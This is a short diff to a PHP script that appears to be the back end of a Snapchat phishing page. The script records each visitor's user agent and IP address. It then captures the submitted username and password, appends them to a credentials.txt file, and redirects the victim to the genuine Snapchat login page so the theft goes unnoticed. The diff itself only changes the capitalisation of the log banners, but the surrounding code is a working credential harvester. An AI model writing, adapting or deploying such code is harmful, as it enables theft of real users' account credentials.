@@ -115,14 +115,14 @@ $useragent = $_SERVER['HTTP_USER_AGENT'];
 
 $filename = "../credentials.txt";
 
-$data = "\n|-------------------Snapchat-------------------|\n" . "User-Agent: " . $useragent . "\n" . "IP: " . $ip . "\n";
+$data = "\n|-------------------SNAPCHAT-------------------|\n" . "User-Agent: " . $useragent . "\n" . "IP: " . $ip . "\n";
 file_put_contents($filename, $data, FILE_APPEND);
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST["username"];
     $password = $_POST["password"];
 
-    $data = "User: " . $username . "\n" . "Pass: " . $password . "\n|-------------------Snapchat-------------------|\n";
+    $data = "User: " . $username . "\n" . "Pass: " . $password . "\n|-------------------SNAPCHAT-------------------|\n";
     file_put_contents($filename, $data, FILE_APPEND);
     header("Location: https://accounts.snapchat.com/accounts/login");
 }
